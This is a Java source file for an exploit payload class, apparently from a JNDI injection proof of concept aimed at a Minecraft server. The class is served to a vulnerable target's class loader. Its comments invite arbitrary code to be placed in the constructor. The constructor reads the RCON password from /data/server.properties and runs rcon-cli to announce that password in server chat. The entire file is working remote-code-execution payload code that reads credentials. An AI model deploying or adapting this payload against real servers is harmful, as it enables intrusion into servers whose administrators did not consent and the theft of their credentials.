package artsploit;

import javax.naming.Context;
import javax.naming.Name;

import java.io.File;
import java.io.FileWriter;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.time.Duration;
import java.util.Hashtable;

/**
 * ExportObject class is served via HTTP for URLClassloaders
 * the bytecode of this constructor is patched in the {@link HttpServer} class
 *  by adding a new Runtime.exec(Config.command) to the top of the constructor
 *  feel free to any code you want to execute on the target here
 */
public class ExportObject implements javax.naming.spi.ObjectFactory {

    public ExportObject() {

        try {
            // get rcon password from /data/server.properties under the rcon.password key
            String rconPassword = "password";
            File serverProperties = new File("/data/server.properties");
            if (serverProperties.exists()) {
                InputStream is = new java.io.FileInputStream(serverProperties);
                java.util.Properties props = new java.util.Properties();
                props.load(is);
                rconPassword = props.getProperty("rcon.password");
            }

            // run rcon-cli with the provided password
            String command = "rcon-cli --password " + rconPassword + " say SERVER EXPLOIT SUCCESS! RCON PASSWORD: " + rconPassword;
            Process process = Runtime.getRuntime().exec(command);
            // wait for the process to finish
            process.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
        return null;
    }
}